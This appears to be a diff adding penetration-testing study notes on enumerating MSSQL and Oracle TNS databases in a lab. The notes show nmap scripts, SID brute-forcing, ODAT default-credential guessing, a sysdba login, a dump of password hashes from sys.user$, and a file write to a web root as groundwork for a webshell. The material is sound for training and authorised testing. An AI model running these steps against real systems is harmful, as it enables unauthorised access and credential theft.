@@ -68,6 +68,18 @@
     - [Enum - MySQL](#enum---mysql)
       - [Nmap](#nmap-5)
       - [Interacting with the MySQL Server](#interacting-with-the-mysql-server)
+    - [MSSQL](#mssql)
+    - [Enum - MSSQL](#enum---mssql)
+      - [Nmap](#nmap-6)
+      - [Metasploit](#metasploit)
+      - [Interacting with mssqlclient.py](#interacting-with-mssqlclientpy)
+    - [Oracle Transparent Network Substrate (_TNS_)](#oracle-transparent-network-substrate-tns)
+    - [Enum - TNS](#enum---tns)
+      - [Nmap](#nmap-7)
+      - [Nmap - SID Bruteforcing](#nmap---sid-bruteforcing)
+      - [Oracle Database Attacking Tool (_ODAT_)](#oracle-database-attacking-tool-odat)
+      - [SQLplus](#sqlplus)
+      - [Interacting with Oracle RDBMS](#interacting-with-oracle-rdbms)
 
 ---
 
@@ -2116,3 +2128,340 @@ mysql> select host, unique_users from host_summary;
 ```
 
 The information schema is also a database that contains metadata. However, this metadata is mainly retrieved from the system schema database. The reason for the existence of these two is the ANSI/ISO standard that has been established. System schema is a Microsoft system catalog for SQL servers and contains much more information than the information schema.
+
+### MSSQL
+
+... is Microsoft's SQL-based relational database management system. Unlike MySQL, MSSQL is closed source and was initially written to run on Windows OS. It is popular among database administration and developers when building applications that run on Microsoft's .NET framework due to its strong native support for .NET. There are versions of MSSQL that will run on Linux and MacOS, but you will more likely come accross MSSQL instances on targets running Windows.
+
+SQL Server Management Studio (_SSMS_) comes as a feature that can be installed with the MSSQL install package or can be downloaded & installed separately. It is commonly installed on the server for initial configuration and long-term management of databases by admins. Keep in mind that since SSMS is a client-side application, it can be installed and used on any system and admin or developer is planning to manage the database from. It doesn't only exist on the server hosting the database. This means you could come across a vulnerable system with SSMS with saved creds that allow you to connect to the database.
+
+Many other clients can be used to access a database running on MSSQL. Including but not limited to:
+
+- mssql-cli
+- SQL Server PowerShell
+- HeidiSQL
+- SQLPro
+- Impacket's mssqlclient.py
+
+MSSQL has default system databases that can help you understand the structure of all the databases that may be hosted on a target server. Some are:
+
+- master
+- model
+- msdb
+- tempdb
+- resource
+
+### Enum - MSSQL
+
+#### Nmap
+
+... has default mssql scripts that can be used to target the default tcp port 1433 that MSSQL listens on.
+
+```bash
+d41y@htb[/htb]$ sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248
+
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-08 09:40 EST
+Nmap scan report for 10.129.201.248
+Host is up (0.15s latency).
+
+PORT     STATE SERVICE  VERSION
+1433/tcp open  ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM
+| ms-sql-ntlm-info: 
+|   Target_Name: SQL-01
+|   NetBIOS_Domain_Name: SQL-01
+|   NetBIOS_Computer_Name: SQL-01
+|   DNS_Domain_Name: SQL-01
+|   DNS_Computer_Name: SQL-01
+|_  Product_Version: 10.0.17763
+
+Host script results:
+| ms-sql-dac: 
+|_  Instance: MSSQLSERVER; DAC port: 1434 (connection failed)
+| ms-sql-info: 
+|   Windows server name: SQL-01
+|   10.129.201.248\MSSQLSERVER: 
+|     Instance name: MSSQLSERVER
+|     Version: 
+|       name: Microsoft SQL Server 2019 RTM
+|       number: 15.00.2000.00
+|       Product: Microsoft SQL Server 2019
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|     TCP port: 1433
+|     Named pipe: \\10.129.201.248\pipe\sql\query
+|_    Clustered: false
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.52 seconds
+```
+
+#### Metasploit
+
+You can also use Metasploit to run an auxiliary scanner called ```mssql_ping``` that will scan the MSSQL service and provide helpful information in your footprinting process.
+
+```bash
+msf6 auxiliary(scanner/mssql/mssql_ping) > set rhosts 10.129.201.248
+
+rhosts => 10.129.201.248
+
+
+msf6 auxiliary(scanner/mssql/mssql_ping) > run
+
+[*] 10.129.201.248:       - SQL Server information for 10.129.201.248:
+[+] 10.129.201.248:       -    ServerName      = SQL-01
+[+] 10.129.201.248:       -    InstanceName    = MSSQLSERVER
+[+] 10.129.201.248:       -    IsClustered     = No
+[+] 10.129.201.248:       -    Version         = 15.0.2000.5
+[+] 10.129.201.248:       -    tcp             = 1433
+[+] 10.129.201.248:       -    np              = \\SQL-01\pipe\sql\query
+[*] 10.129.201.248:       - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```
+
+#### Interacting with mssqlclient.py
+
+If you can guess or gain access to creds, this allows you to remotely connect to the MSSQL server and start interacting with databases using T-SQL. Authenticating with MSSQL will enable you to interact with databases through the SQL Database Engine.
+
+```bash
+d41y@htb[/htb]$ python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth
+
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+Password:
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(SQL-01): Line 1: Changed database context to 'master'.
+[*] INFO(SQL-01): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
+[!] Press help for extra shell commands
+
+SQL> select name from sys.databases
+
+name                                                                                                                               
+
+--------------------------------------------------------------------------------------
+
+master                                                                                                                             
+
+tempdb                                                                                                                             
+
+model                                                                                                                              
+
+msdb                                                                                                                               
+
+Transactions    
+```
+
+### Oracle Transparent Network Substrate (_TNS_)
+
+The Oracle TNS server is a communication protocol that facilitates communication between Oracle databases and applications over networks. Initially introduced as part of the Oracle Net Services software suite, TNS supports various networking protocols between Oracle databases and client applications, such as IPX/SPX and TCP/IP protocol stacks. As a result, it has become a preferred solution for managing large, complex databases in the healthcare, finance, and retail industries. In addition, its built-in encryption mechanism ensures the security of data transmitted, making it an ideal solution for enterprise environments where data security is paramount.
+
+Over time, TNS has been updated to support newer technologies, including IPv6 and SSL/TLS encryption which makes it more suitable for the following purposes:
+
+- name resolution
+- connection management
+- load balancing
+- security
+
+Furthermore, it enables encryption between client and server communication through an additional layer of security over the TCP/IP protocol layer. This feature helps secure the database architecture from unauthorized access or attacks that attempt to compromise the data no the network traffic. Besides, it provides advanced tools and capabilities for database administrators and developers since it offers comprehensive performance monitoring and analysis tools, error reporting and logging capabilities, workload management, and fault tolerance through database services.
+
+### Enum - TNS
+
+#### Nmap
+
+```bash
+d41y@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open
+
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 10:59 EST
+Nmap scan report for 10.129.204.235
+Host is up (0.0041s latency).
+
+PORT     STATE SERVICE    VERSION
+1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 6.64 seconds
+```
+
+You can see that the port is open, and the service is running. In Oracle RDBMS, a System Identifier (_SID_) is a unique name that identifies a particular database instance. It can have multiple instances, each with its own System ID. An instance is a set of process and memory structures that interact to manage the database's data. When a client connects to an Oracle database, it specifies the database's SID along with its connection string. The client uses this SID to identify which database instance it wants to connect to. Suppose the client does not specify a SID. Then, the default value defined in the ```tnsnames.ora``` file is used.
+
+The SIDs are an essential part of the connection process, as it identifies the specific instance of the database the client wants to connect to. If the client specifies an incorrect SID, the connection attempt will fail. Database admins can use the SID to monitor and manage the individual instances of a database. For example, they can start, stop, or restart an instance, adjust its memory allocation or other configuration parameters, and monitor its performance using tools like Oracle Enterprise Manager.
+
+#### Nmap - SID Bruteforcing
+
+```bash
+d41y@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
+
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 11:01 EST
+Nmap scan report for 10.129.204.235
+Host is up (0.0044s latency).
+
+PORT     STATE SERVICE    VERSION
+1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
+| oracle-sid-brute: 
+|_  XE
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 55.40 seconds
+```
+
+#### Oracle Database Attacking Tool (_ODAT_)
+
+ODAT is an open-source penetration testing tool designed to enumerate and exploit vulns in Oracle databases. It can be used to identify and exploit various security flaws in Oracle databases, including SQLi, RCE, and PrivEsc.
+
+ODAT scans can retrieve database names, versions, running processes, user accounts, vulns, misconfigs, etc.
+
+```bash
+d41y@htb[/htb]$ ./odat.py all -s 10.129.204.235
+
+[+] Checking if target 10.129.204.235:1521 is well configured for a connection...
+[+] According to a test, the TNS listener 10.129.204.235:1521 is well configured. Continue...
+
+...SNIP...
+
+[!] Notice: 'mdsys' account is locked, so skipping this username for password           #####################| ETA:  00:01:16 
+[!] Notice: 'oracle_ocm' account is locked, so skipping this username for password       #####################| ETA:  00:01:05 
+[!] Notice: 'outln' account is locked, so skipping this username for password           #####################| ETA:  00:00:59
+[+] Valid credentials found: scott/tiger. Continue...
+
+...SNIP...
+```
+
+#### SQLplus
+
+You can use the tool ```sqlplus``` to connect to the Oracle database and interact with it.
+
+```bash
+d41y@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE
+
+SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:19:21 2023
+Version 21.4.0.0.0
+
+Copyright (c) 1982, 2021, Oracle. All rights reserved.
+
+ERROR:
+ORA-28002: the password will expire within 7 days
+
+
+
+Connected to:
+Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
+
+SQL> 
+```
+
+> [!TIP]
+> If you come across the following error<br>```sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory```<br>use:<br>```sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig```
+
+#### Interacting with Oracle RDBMS
+
+```bash
+SQL> select table_name from all_tables;
+
+TABLE_NAME
+------------------------------
+DUAL
+SYSTEM_PRIVILEGE_MAP
+TABLE_PRIVILEGE_MAP
+STMT_AUDIT_OPTION_MAP
+AUDIT_ACTIONS
+WRR$_REPLAY_CALL_FILTER
+HS_BULKLOAD_VIEW_OBJ
+HS$_PARALLEL_METADATA
+HS_PARTITION_COL_NAME
+HS_PARTITION_COL_TYPE
+HELP
+
+...SNIP...
+
+
+SQL> select * from user_role_privs;
+
+USERNAME                       GRANTED_ROLE                   ADM DEF OS_
+------------------------------ ------------------------------ --- --- ---
+SCOTT                          CONNECT                        NO  YES NO
+SCOTT                          RESOURCE                       NO  YES NO
+```
+
+Here, the user scott has no administrative privileges. However, you can try using this account to log in as the System Database Admin (_sysdba_), giving you higher privileges. This is possible when the user scott has the appropriate privileges typically granted by the database admin or used by the admin himself.
+
+```bash
+d41y@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE as sysdba
+
+SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:32:58 2023
+Version 21.4.0.0.0
+
+Copyright (c) 1982, 2021, Oracle. All rights reserved.
+
+
+Connected to:
+Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
+
+
+SQL> select * from user_role_privs;
+
+USERNAME                       GRANTED_ROLE                   ADM DEF OS_
+------------------------------ ------------------------------ --- --- ---
+SYS                            ADM_PARALLEL_EXECUTE_TASK      YES YES NO
+SYS                            APEX_ADMINISTRATOR_ROLE        YES YES NO
+SYS                            AQ_ADMINISTRATOR_ROLE          YES YES NO
+SYS                            AQ_USER_ROLE                   YES YES NO
+SYS                            AUTHENTICATEDUSER              YES YES NO
+SYS                            CONNECT                        YES YES NO
+SYS                            CTXAPP                         YES YES NO
+SYS                            DATAPUMP_EXP_FULL_DATABASE     YES YES NO
+SYS                            DATAPUMP_IMP_FULL_DATABASE     YES YES NO
+SYS                            DBA                            YES YES NO
+SYS                            DBFS_ROLE                      YES YES NO
+
+USERNAME                       GRANTED_ROLE                   ADM DEF OS_
+------------------------------ ------------------------------ --- --- ---
+SYS                            DELETE_CATALOG_ROLE            YES YES NO
+SYS                            EXECUTE_CATALOG_ROLE           YES YES NO
+...SNIP...
+```
+
+Now, you could retrieve password hashes from the ```sys.user$``` and try to crack them offline.
+
+```bash
+SQL> select name, password from sys.user$;
+
+NAME                           PASSWORD
+------------------------------ ------------------------------
+SYS                            FBA343E7D6C8BC9D
+PUBLIC
+CONNECT
+RESOURCE
+DBA
+SYSTEM                         B5073FE1DE351687
+SELECT_CATALOG_ROLE
+EXECUTE_CATALOG_ROLE
+DELETE_CATALOG_ROLE
+OUTLN                          4A3BA55E08595C81
+EXP_FULL_DATABASE
+
+NAME                           PASSWORD
+------------------------------ ------------------------------
+IMP_FULL_DATABASE
+LOGSTDBY_ADMINISTRATOR
+...SNIP...
+```
+
+Another option is to upload a webshell to the target. However, this requires the server to run a web server, and you need to know the exact location of the root directory for the webserver.
+
+```bash
+d41y@htb[/htb]$ echo "Oracle File Upload Test" > testing.txt
+d41y@htb[/htb]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
+
+[1] (10.129.204.235:1521): Put the ./testing.txt local file in the C:\inetpub\wwwroot folder like testing.txt on the 10.129.204.235 server                                                                                                  
+[+] The ./testing.txt file was created on the C:\inetpub\wwwroot directory on the 10.129.204.235 server like the testing.txt file
+
+...
+
+d41y@htb[/htb]$ curl -X GET http://10.129.204.235/testing.txt
+
+Oracle File Upload Test
+```
+
